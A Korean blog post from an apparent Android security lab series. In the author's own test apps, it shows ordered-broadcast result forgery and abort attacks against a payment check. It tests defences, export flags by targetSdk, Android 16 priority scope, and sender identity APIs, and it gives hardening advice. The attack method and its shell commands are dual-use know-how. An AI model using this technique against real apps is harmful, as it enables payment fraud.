![package 모드: PayActivity send mode=package otp=677805, Verifier in/out, PayActivity final code=0 ... -> DENIED, BCASTATK 줄 없음. permission 모드: send otp=315830, W/BroadcastQueue: Permission Denial: receiving Intent { act=io.seika.bcastlab.action.CHECK flg=0x10 (has extras) } to ProcessRecord{2923bde 6541:io.seika.bcastatk/u0a180} (pid=6541, uid=10180) requires io.seika.bcastlab.permission.INTERNAL due to sender io.seika.bcastlab (uid 10179) 두 번, final -> DENIED. 셸의 am broadcast -a io.seika.bcastlab.action.CHECK --ei amount 50000은 Broadcast completed: result=-1, data="APPROVED (rewritten by bcastatk LO)", logcat에 HI(999) got ... otp=null code=0 data=null, W/BroadcastQueue: Exported Denial: sending Intent ... from null (uid=2000) due to receiver ProcessRecord{25b7eb6 6638:io.seika.bcastlab/u0a179} (uid 10179) not specifying RECEIVER_EXPORTED, LO(-999) rewrote result](/assets/img/android-mastery/p1c16/11-device-ordered-defence.png)

`package` 모드에서는 공격자 리시버가 후보에도 오르지 않았다. 로그에 BCASTATK가 한 줄도 없고 결과는 DENIED다. `permission` 모드에서는 HI와 LO가 각각 `Permission Denial: receiving ... requires io.seika.bcastlab.permission.INTERNAL`로 걸러졌다.

공격자 매니페스트에는 `INTERNAL`이 `uses-permission`으로 들어 있다. [브로드캐스트 문서](https://developer.android.com/develop/background-work/background-tasks/broadcasts)는 권한을 붙여 보내면 `<uses-permission>`으로 요청한 리시버만 받는다고 쓰고 dangerous 권한은 부여까지 필요하다고 덧붙이지만, 서명 권한도 서명이 다르면 요청해도 부여되지 않는다는 말은 없다. 이번 공격자가 바로 그 경우였고, `uses-permission`에 적어 두기만 한 상태로는 막혔다. 권한 수준을 `normal`로 잡았다면 요청만으로 부여되니 같은 코드가 공격자를 막지 못했을 것이다. 이 경우는 돌려 보지 않았다.

끝에 셸로 직접 보낸 `CHECK`는 피해자의 `Verifier`에게 `Exported Denial ... not specifying RECEIVER_EXPORTED`로 막혔다([BroadcastQueue.java 925~938행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/am/BroadcastQueue.java#925)). 공격자 HI와 LO는 그대로 받았고, `am broadcast` 자체가 ordered라 LO가 셸의 결과까지 고쳐 써서 셸에 `result=-1, data="APPROVED (rewritten by bcastatk LO)"`가 찍혔다.

결과를 꼭 돌려받아야 하는 게 아니면 ordered broadcast를 쓰지 않는 편이 낫다. 같은 앱 안에서 판정을 주고받는 일이라면 브로드캐스트 대신 메서드 호출이나 앱 내부 콜백으로 충분하다. 브로드캐스트를 써야 한다면 `setPackage()`나 서명 권한으로 수신자를 좁히고, 결과 리시버에서는 결과 코드만 믿지 말고 판정을 앱 안에서 다시 확인한다. 받는 쪽은 `android:permission`에 서명 권한을 걸고, 매니페스트에 꼭 둘 필요가 없는 리시버는 `exported="false"`나 `RECEIVER_NOT_EXPORTED`로 등록한다. 회귀 검사는 위 명령 그대로다. 다른 키로 서명한 앱에서 보내 `Permission Denial`이 찍히는지, 같은 액션에 999와 -999 리시버를 걸어 둔 상태에서 결제가 DENIED로 끝나는지 확인하면 된다.

## 컨텍스트 등록 플래그는 기기가 아니라 targetSdk를 따른다

`RECEIVER_EXPORTED`와 `RECEIVER_NOT_EXPORTED`는 API 33에 들어왔고, [Android 14 동작 변경](https://developer.android.com/about/versions/14/behavior-changes-14#runtime-receivers-exported) 문서는 targetSdk 34 이상 앱이 런타임에 등록하는 리시버에 둘 중 하나를 반드시 줘야 한다고 쓴다. 이 규칙을 거는 장치는 앱 호환성 변경 161145287(`DYNAMIC_RECEIVER_EXPLICIT_EXPORT_REQUIRED`)이고, Android 13에는 `@Disabled`, Android 14에는 `@EnabledSince(UPSIDE_DOWN_CAKE)`로 들어 있다([ActivityManagerService.java(13) 577~579행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/am/ActivityManagerService.java#577), [ActivityManagerService.java(14) 624~632행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-14.0.0_r1/services/core/java/com/android/server/am/ActivityManagerService.java#624)).

`io.seika.bcastreg`는 플래그 없이, `RECEIVER_EXPORTED`로, `RECEIVER_NOT_EXPORTED`로 리시버 셋을 등록해 보는 프로브다. 먼저 Android 13에서 그대로 돌리고, `am compat enable`로 변경을 강제로 켠 다음 다시 돌렸다.

![API 33에서 dumpsys platform_compat 결과 ChangeId(161145287; name=DYNAMIC_RECEIVER_EXPLICIT_EXPORT_REQUIRED; disabled). RegActivity pkg=io.seika.bcastreg targetSdk=33 sdk=33, noflag/exported/notexported 모두 registered. am broadcast -a io.seika.bcastreg.PING 후 noflag got io.seika.bcastreg.PING, exported got PING, notexported는 W/BroadcastQueue: Exported Denial ... from null (uid=2000) ... not specifying RECEIVER_EXPORTED. am compat enable DYNAMIC_RECEIVER_EXPLICIT_EXPORT_REQUIRED io.seika.bcastreg 후 packageOverrides={io.seika.bcastreg=true}, 다시 실행하자 I/BCASTREG: noflag: SecurityException: io.seika.bcastreg: One of RECEIVER_EXPORTED or RECEIVER_NOT_EXPORTED should be specified when a receiver isn't being registered exclusively for system broadcasts, 마지막에 am compat reset](/assets/img/android-mastery/p1c16/12-device-register-flags.png)

Android 13에서 플래그 없이 등록한 리시버는 셸의 `PING`을 받았다. 플래그를 빼먹으면 exported로 취급된다. 변경을 켜자 같은 호출이 `SecurityException`으로 바뀌었다. 같은 코드를 패키지명만 바꿔 targetSdk 33(`io.seika.bcastreg`)과 34(`io.seika.bcastreg34`)로 빌드해 Android 16 에뮬레이터에 깔아 보면, 기기 버전이 최신이어도 갈림길은 targetSdk라는 게 바로 보인다.

![API 36에서 install -r out/bcastreg.apk와 out/bcastreg34.apk, ChangeId(161145287; name=DYNAMIC_RECEIVER_EXPLICIT_EXPORT_REQUIRED; enableSinceTargetSdk=34). RegActivity pkg=io.seika.bcastreg targetSdk=33 sdk=36은 noflag/exported/notexported 모두 registered, RegActivity pkg=io.seika.bcastreg34 targetSdk=34 sdk=36은 noflag: SecurityException: io.seika.bcastreg34: One of RECEIVER_EXPORTED or RECEIVER_NOT_EXPORTED should be specified ..., exported와 notexported는 registered](/assets/img/android-mastery/p1c16/13-aux36-register-flags.png)

Android 16 기기에서도 targetSdk 33 앱은 플래그 없이 등록됐다. 다른 uid에서 이 리시버로 보내 보는 것은 Android 13에서만 했지만, 등록이 그대로 되니 오래된 targetSdk로 남은 앱의 `registerReceiver(receiver, filter)` 두 인자 호출은 최신 기기에서도 Android 13에서처럼 exported로 취급될 것으로 보인다. 점검할 때는 jadx에서 두 인자짜리 `registerReceiver` 호출과 세 번째 인자 값을 같이 grep한다.

## Android 16에서 우선순위는 프로세스 안에서만 지켜질까

[Android 16 동작 변경 문서](https://developer.android.com/about/versions/16/behavior-changes-all#ordered-broadcast-priority)는 ordered broadcast 우선순위의 범위가 더는 전역이 아니라고 적는다. 서로 다른 프로세스 사이의 전달 순서는 보장되지 않고, 우선순위는 같은 프로세스 안에서만 지켜진다는 내용이다. 앱이 줄 수 있는 값도 `SYSTEM_LOW_PRIORITY + 1`부터 `SYSTEM_HIGH_PRIORITY - 1`까지로 잘린다.

![developer.android.com Android 16 동작 변경(모든 앱) 페이지의 "Ordered broadcast priority scope no longer global" 절. android:priority와 IntentFilter#setPriority()로 정한 전달 순서가 Android 16에서는 다른 프로세스 사이에서 보장되지 않고 같은 애플리케이션 프로세스 안에서만 지켜진다는 문단, 우선순위가 (SYSTEM_LOW_PRIORITY + 1, SYSTEM_HIGH_PRIORITY - 1) 범위로 제한된다는 문단](/assets/img/android-mastery/p1c16/28-doc-a16-priority-scope.png)

문서대로라면 HI와 LO의 공격이 Android 16에서는 깨져야 한다. 그런데 `android-16.0.0_r2`의 [BroadcastRecord.java 786~799행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-16.0.0_r2/services/core/java/com/android/server/am/BroadcastRecord.java#786)을 보면 `ordered`면 모든 리시버를 앞 리시버가 끝날 때까지 막아 두고, `limitPriorityScope` 분기는 unordered 쪽 `else` 안에만 있다.

![android-16.0.0_r2 BroadcastRecord.java 785~799행 calculateBlockedUntilBeyondCount. 790행 if (ordered) 강조, 주석 "When sending an ordered broadcast, we need to block this receiver until all previous receivers have terminated", blockedUntilBeyondCount[i] = i, 796행 else 안에서 if (Flags.limitPriorityScope()) calculateChangeStateForReceivers(receivers, LIMIT_PRIORITY_SCOPE, platformCompat)](/assets/img/android-mastery/p1c16/24-src-a16-ordered-serial.png)

문서와 코드가 다른 말을 하니 기기에서 돌려 보는 수밖에 없었다. 먼저 API 36 에뮬레이터에서 두 기능이 켜져 있는지 확인했다.

![API 36에서 getprop ro.build.version.sdk 결과 36, aflags list 결과 com.android.server.am.limit_priority_scope enabled - default read-only system, com.android.server.am.restrict_priority_values enabled - default read-only system, dumpsys platform_compat 결과 ChangeId(371309185; name=RESTRICT_PRIORITY_VALUES)와 ChangeId(371307720; name=LIMIT_PRIORITY_SCOPE)가 disabled 표시 없이 나열됨](/assets/img/android-mastery/p1c16/14-aux36-priority-flags.png)

aconfig 플래그 둘 다 enabled이고, 두 ChangeId도 `disabled`나 targetSdk 조건 없이 나열돼 모든 앱에 켜진 상태다. 999와 -999는 잘리는 범위 안이라 값 제한의 영향은 없다. 이 상태에서 `forge`와 `abort`를 다시 돌렸다. 타임스탬프를 보려고 `-v time`으로 찍었다.

![API 36에서 forge 모드: 17:32:44.512 PayActivity send otp=375801, 44.522 BCASTATK(5106) HI(999) got ordered=true otp=375801, 44.914 BCASTLAB(5140) Verifier(0) in/out DENIED, 44.924 LO(-999) got ... DENIED, 44.924 LO(-999) rewrote result -> code=-1 APPROVED, 46.288 PayActivity final code=-1 ... -> APPROVED. abort 모드: 55.240 send otp=206892, 55.246 HI got, 55.247 HI setResult(OK) + abortBroadcast() abort=true, 55.268 PayActivity final code=-1 data=APPROVED (set by bcastatk HI, then aborted) -> APPROVED](/assets/img/android-mastery/p1c16/15-aux36-ordered.png)

pid 5106(공격자)과 5140(피해자)은 서로 다른 프로세스인데도 HI(999) → `Verifier`(0) → LO(-999) 순서가 그대로였고, LO의 덮어쓰기와 HI의 abort가 Android 13과 똑같이 먹혔다. 이 이미지에서는 코드 쪽 설명이 맞았다. `limitPriorityScope` 분기가 unordered 경로에만 있으니 범위 제한은 일반 브로드캐스트에만 걸리는 것으로 보이지만, API 36에서 일반 브로드캐스트의 순서는 따로 돌려 보지 않았다.

처음 찍었을 때는 이 결과를 못 봤다. 차가운 첫 실행이 3초 안에 끝나지 않아 앞 실행의 LO 줄이 뒤 실행 로그에 섞였다. 대기 시간을 8초로 늘리고 다시 찍었다. 위 캡처에서도 첫 실행은 송신부터 결과까지 1.8초쯤 걸렸는데, 왜 그렇게 느린지는 따로 파 보지 않았다.

## getSentFromUid는 동의한 발신자만 보여 준다

리시버가 발신자를 모르는 문제에 Android 14가 답을 하나 내놨다. `BroadcastReceiver.getSentFromUid()`와 `getSentFromPackage()`다. 단, 보내는 쪽이 `BroadcastOptions.setShareIdentityEnabled(true)`로 동의했을 때만 값이 채워진다. 동의 여부는 [BroadcastRecord.java 508행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-16.0.0_r2/services/core/java/com/android/server/am/BroadcastRecord.java#508)이 옵션에서 읽고, 동의가 없을 때 돌아오는 -1과 null은 [BroadcastReceiver.java 718~734행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-16.0.0_r2/core/java/android/content/BroadcastReceiver.java#718)에 적혀 있다. `CtrlReceiver` 로그에 이 값을 같이 찍게 해 두었으니 API 36에서 셸, 공격자 앱, 동의하고 보내는 피해자 앱 순서로 보내 봤다.

![API 36에서 am broadcast -n io.seika.bcastlab/.CtrlReceiver ... --es origin push-server 결과 Broadcast completed: result=0, CtrlReceiver UNLOCK accepted origin=push-server code=null sentFromUid=-1 sentFromPackage=null. FireActivity sent ... uid=10219 뒤 CtrlReceiver UNLOCK accepted code=atk sentFromUid=-1 sentFromPackage=null. MainActivity sent ... shareIdentity=true 뒤 CtrlReceiver UNLOCK accepted code=app sentFromUid=10218 sentFromPackage=io.seika.bcastlab. pm list packages -U 결과 io.seika.bcastlab uid:10218, io.seika.bcastatk uid:10219, io.seika.bcastreg34 uid:10217, io.seika.bcastreg uid:10216](/assets/img/android-mastery/p1c16/16-aux36-sender-identity.png)

셸과 공격자 앱은 `sentFromUid=-1`, `sentFromPackage=null`이었고, 동의한 피해자 앱만 자기 UID 10218과 패키지명이 찍혔다. 이 에뮬레이터는 adbd가 root라 셸 쪽은 uid 0으로 보낸 것인데도 -1이었다. 이 API로 "알려진 발신자만 받기"는 할 수 있다. 값이 -1이면 거절하고 기대한 패키지면 받는 식이다. 하지만 동의하지 않은 발신자를 식별할 방법은 아니고, 정상 발신자도 이 옵션을 켜고 보내야 하니 결국 송신 코드까지 같이 고쳐야 한다. 매니페스트의 서명 권한 하나가 그보다 간단하고 Android 13 이하 기기에서도 통한다.

Android 13에서는 `Lab.sentFrom()`이 SDK 34 미만이면 값을 읽지 않게 되어 있어 앞의 캡처들에 `sentFrom=n/a(sdk 33)`로 찍혔다.

*다음 글: [Service·Messenger·AIDL 실습](/posts/android-lab-p1c17-service-messenger-aidl/)*
